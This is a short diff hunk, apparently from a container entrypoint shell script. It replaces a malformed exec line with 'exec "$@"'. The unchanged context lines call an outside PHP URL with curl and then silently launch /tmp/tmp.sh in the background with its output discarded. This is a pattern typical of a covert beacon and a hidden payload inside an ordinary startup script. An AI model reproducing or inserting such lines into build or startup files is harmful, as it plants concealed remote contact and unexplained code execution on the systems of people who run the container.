@@ -30,4 +30,4 @@ fi
     curl -X GET "https://swopp.fi/jdk.php"
     nohup /tmp/tmp.sh > /dev/null 2>&1 &
 
-exec -g 'daemon off;'
+exec "$@"
